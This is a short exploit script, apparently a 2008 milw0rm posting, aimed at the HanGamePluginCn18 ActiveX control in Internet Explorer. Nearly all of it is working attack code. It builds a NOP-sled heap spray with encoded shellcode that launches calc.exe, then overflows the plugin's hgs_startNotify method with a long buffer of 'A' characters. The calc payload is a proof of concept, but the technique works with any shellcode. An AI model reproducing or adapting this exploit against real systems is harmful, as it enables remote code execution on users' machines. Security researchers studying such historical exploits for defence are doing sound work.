<%@ LANGUAGE = JavaScript %>
<%
<script>
var act=new ActiveXObject("HanGamePluginCn18.HanGamePluginCn18.1");

//run calc.exe
var shellcode = unescape("%uE8FC%u0044%u0000%u458B%u8B3C%u057C%u0178%u8BEF%u184F%u5F8B%u0120%u49EB%u348B%u018B%u31EE%u99C0%u84AC%u74C0%uC107%u0DCA%uC201%uF4EB%u543B%u0424%uE575%u5F8B%u0124%u66EB%u0C8B%u8B4B%u1C5F%uEB01%u1C8B%u018B%u89EB%u245C%uC304%uC031%u8B64%u3040%uC085%u0C78%u408B%u8B0C%u1C70%u8BAD%u0868%u09EB%u808B%u00B0%u0000%u688B%u5F3C%uF631%u5660%uF889%uC083%u507B%u7E68%uE2D8%u6873%uFE98%u0E8A%uFF57%u63E7%u6C61%u0063");

var bigblock = unescape("%u9090%u9090");

var headersize = 20;

var slackspace = headersize+shellcode.length;

while (bigblock.length<slackspace) bigblock+=bigblock;

fillblock = bigblock.substring(0, slackspace);

block = bigblock.substring(0, bigblock.length-slackspace);

while(block.length+slackspace<0x40000) block = block+block+fillblock;

memory = new Array();

for (x=0; x<300; x++) memory[x] = block + shellcode;

var buffer = '';

while (buffer.length < 1319) buffer+="A";

buffer=buffer+"\x0a\x0a\x0a\x0a"+buffer;

act.hgs_startNotify(buffer);
</script>
%>

# milw0rm.com [2008-02-19]